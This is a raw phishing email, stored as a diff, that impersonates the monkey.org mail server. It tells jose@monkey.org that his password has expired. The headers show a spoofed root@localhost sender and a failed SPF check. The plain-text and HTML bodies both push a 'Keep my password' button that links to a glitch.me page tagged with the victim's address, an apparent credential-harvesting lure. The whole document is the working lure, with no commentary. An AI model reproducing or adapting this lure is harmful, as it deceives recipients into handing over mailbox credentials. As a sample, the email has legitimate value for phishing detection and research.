@@ -1,0 +1,163 @@
+From jose@monkey.org Thu Jun 22 11:10:42 2023 +0000
+Return-Path: perfectcode@perfectcode.com.hk
+Delivered-To: jose@monkey.org
+X-FDA: 80930115924.14.1EB83FC
+Received: from vps8483.youcloud.hk (vps8483.youcloud.hk [203.135.154.116])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id B85B48000F
+	for <jose@monkey.org>; Thu, 22 Jun 2023 11:10:40 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf11.b.hostedemail.com: domain of perfectcode@perfectcode.com.hk does not designate 203.135.154.116 as permitted sender) smtp.mailfrom=perfectcode@perfectcode.com.hk;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1687432241;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=kQ686Dqavw0+SlQaK8WPfUv8HWSTAN2mdx+3gTbTXak=;
+	b=pmdpLDRnIZP4nvTRTEtFYfq/c5VYZtKywlHOa7rWQeq5IHci5nCWGMxZAfW0EYyFpYxpt5
+	iQ2JeXqxkUVdlqhXeZ2NHmy2B/XZByrvmkXHR9JJeyfAoSSPXDWo68X/8aph3L8mGo022j
+	yZINtr9F5u0FPD2Fo8Xdz/c1Fr2SZKo=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1687432241; a=rsa-sha256;
+	cv=none;
+	b=09WIzh5gfd+M4RKrs+MGAAXwY4piuNeb64GtYyUAg9ZYca1P4Qt33dI5/FSUmfNPdDIvef
+	RsdrY8sItPKw4p0uwzlO3XZzK4SmnJJSPh5jOBZlx7g6V40qVLUlVNQD+6lck0goLCF86J
+	b3WSPKvbanb0j1HDIX0HrpYx6m5zdnA=
+ARC-Authentication-Results: i=1;
+	imf11.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf11.b.hostedemail.com: domain of perfectcode@perfectcode.com.hk does not designate 203.135.154.116 as permitted sender) smtp.mailfrom=perfectcode@perfectcode.com.hk;
+	dmarc=none
+Received: by vps8483.youcloud.hk (Postfix, from userid 10002)
+	id F2175115DCBF; Thu, 22 Jun 2023 19:15:15 +0800 (HKT)
+To: jose@monkey.org
+Subject: Security Warning for jose@monkey.org
+Date: Thu, 22 Jun 2023 11:15:15 +0000
+From: Root User <root@localhost>
+Message-ID: <c1538e3b9afbc0031804953c0cdc2969@perfectcode.com.hk>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="b1_c1538e3b9afbc0031804953c0cdc2969"
+Content-Transfer-Encoding: 8bit
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: B85B48000F
+X-Stat-Signature: uh8oioonyfpbnp9z5tbctoaog91ab7xi
+X-Rspam-User: 
+X-Spam-Status: No, score=8.50
+X-HE-Tag: 1687432240-38338
+X-HE-Meta: U2FsdGVkX1+RW/XHvNfgjiP6/vTwIuXI5dSeBhrR7OEQnzTj50jVOJbQqZEEpVTHXv7GwdCYGM21aXKSpnC69jgqyxEHTcZhVxsWoGafGWKYqCWnruaK8tNXaptpvLZpT5sWoUGD2x8qHHvunsj+gvSCFnY8wm5XZo5Qrr5nk/cDAh2oK4KrnHmaRsskIB9sZB+dB2WayTrRrsMdc6RbePXthwNOZHNTFQ+WwSJSh1k=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 170
+
+This is a multi-part message in MIME format.
+
+--b1_c1538e3b9afbc0031804953c0cdc2969
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+
+
+
+
+    
+    
+
+
+
+    monkey.org  Server - Password Expired
+    The password to your mailbox jose@monkey.org has expired. System will log you out and generate a new password exactly 24 hours from now.
+    You can continue using your current password. Use the button below to keep using the current password.
+    
+        
+    
+    
+        
+            
+                Keep my password
+            
+        
+    
+    We will encourage you to take your time to maintain your current password to avoid login interruptions.
+    Thank you©2023 monkey.org All rights reserved.
+
+
+
+
+--b1_c1538e3b9afbc0031804953c0cdc2969
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7600.16385">
+</head>
+
+<body>
+    <p style=3D"MARGIN-TOP: 0px;"><span style=3D'color: rgb(41, 105, 176); =
+font-size: 19px; font-family: "Times New Roman", Times, serif;'>monkey.org<=
+/span>=C2=A0 <span style=3D"color: rgb(0, 0, 0);">Server - Password Expired=
+</span></p>
+    <p style=3D"FONT-SIZE: 14px;"><span style=3D'font-family: "calibri ligh=
+t", serif, EmojiFont; color: rgb(0, 0, 0);'>The password to your mailbox <s=
+pan style=3D"background-color: rgb(239, 239, 239);">jose@monkey.org</span> =
+has expired. System will log you out and generate a new password exactly 24=
+ hours from now.</span></p>
+    <p style=3D"FONT-SIZE: 14px;"><span style=3D'font-family: "calibri ligh=
+t", serif, EmojiFont; color: rgb(0, 0, 0);'>You can continue using your cur=
+rent password. Use the button below to keep using the current password.</sp=
+an></p>
+    <table style=3D"BORDER-COLLAPSE: collapse; FONT-FAMILY: roboto, sans-se=
+rif; COLOR: rgb(44,54,58); FONT-SIZE: 14px;" border=3D"0" cellspacing=3D"0"=
+>
+        <tbody></tbody>
+    </table>
+    <table style=3D"BORDER-COLLAPSE: collapse; FONT-FAMILY: roboto, sans-se=
+rif; COLOR: rgb(44,54,58); FONT-SIZE: 14px;" border=3D"0" cellspacing=3D"0"=
+>
+        <tbody>
+            <tr>
+                <td style=3D"MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; BACKGROU=
+ND-COLOR: rgb(38,114,236); PADDING-LEFT: 20px; PADDING-RIGHT: 20px; PADDING=
+-TOP: 5px;" bgcolor=3D"#2672ec"><a style=3D"TEXT-ALIGN: center; BACKGROUND-=
+COLOR: transparent; FONT-FAMILY: 'segoe ui semibold', 'segoe ui bold', 'seg=
+oe ui', 'helvetica neue medium', arial, sans-serif; COLOR: rgb(255,255,255)=
+; FONT-WEIGHT: 600; text-decoration-line: none;" href=3D"https://mango-seda=
+te-manchego.glitch.me/hull.html#jose@monkey.org" rel=3D"noopener noreferrer=
+" target=3D"_blank"><span style=3D"font-size: 13px;">Keep my password</span=
+></a></td>
+            </tr>
+        </tbody>
+    </table>
+    <p style=3D"FONT-SIZE: 14px;"><span style=3D'font-family: "calibri ligh=
+t", serif, EmojiFont; color: rgb(0, 0, 0);'>We will encourage you to take y=
+our time to maintain your current password to avoid login interruptions.</s=
+pan></p>
+    <p style=3D"FONT-SIZE: 14px;"><span style=3D"color: rgb(0, 0, 0);"><br =
+aria-hidden=3D"true" style=3D"FONT-FAMILY: roboto, sans-serif; COLOR: rgb(4=
+4,54,58);"></span><span style=3D"FONT-FAMILY: arial, serif, EmojiFont; COLO=
+R: rgb(44,54,58);"><span style=3D'font-family: "times new roman", serif, Em=
+ojiFont; color: rgb(0, 0, 0);'><span style=3D'font-family: "calibri light",=
+ serif, EmojiFont;'>Thank you</span></span></span><span style=3D"color: rgb=
+(0, 0, 0);"><br aria-hidden=3D"true" style=3D"FONT-FAMILY: roboto, sans-ser=
+if; COLOR: rgb(44,54,58);"></span><span style=3D"COLOR: rgb(44,54,58);"><sp=
+an style=3D'font-family: "calibri light", serif, EmojiFont; color: rgb(0, 0=
+, 0);'>=C2=A92023=C2=A0</span><span style=3D"color: rgb(0, 0, 0);">monkey.o=
+rg</span></span><span style=3D"FONT-FAMILY: arial, serif, EmojiFont; COLOR:=
+ rgb(44,54,58);"><span style=3D"color: rgb(0, 0, 0);">=C2=A0</span><span st=
+yle=3D'font-family: "times new roman", serif, EmojiFont; color: rgb(0, 0, 0=
+);'><span style=3D'font-family: "calibri light", serif, EmojiFont;'>All rig=
+hts reserved.</span></span><span style=3D"FONT-FAMILY: 'times new roman', s=
+erif, EmojiFont;"><span style=3D"FONT-FAMILY: 'calibri light', serif, Emoji=
+Font;"><br></span></span></span></p>
+</body>
+
+</html>
+
+
+--b1_c1538e3b9afbc0031804953c0cdc2969--
